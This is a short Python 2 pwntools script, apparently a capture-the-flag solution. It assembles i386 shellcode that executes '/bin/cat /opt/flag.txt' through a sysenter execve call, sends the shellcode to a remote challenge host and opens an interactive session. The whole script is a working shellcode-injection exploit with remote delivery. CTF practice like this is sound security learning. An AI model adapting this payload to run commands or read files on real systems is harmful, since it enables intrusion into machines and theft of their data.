#!/usr/bin/env python2

from pwn import *

context.clear(arch='i386')
payload = asm(
    """
    mov esp, 0xbeeffe00
    mov ebp, esp
    """ +
    shellcraft.pushstr('/bin/cat') +
    """
    mov esi, esp
    """ +
    shellcraft.pushstr('/opt/flag.txt') +
    """
    mov edi, esp
    """ +
    """
    xor edx, edx
    push edx
    push edi
    push esi
    mov ecx, esp
    mov ebx, esi
    mov eax, 11
    sysenter
    """
)

r = remote('uni.hctf.fun', 13372)
r.recvuntil('code!\n')
r.send(payload + 'deadbeef')
r.recvuntil("[*] let's go...\n")
r.interactive()
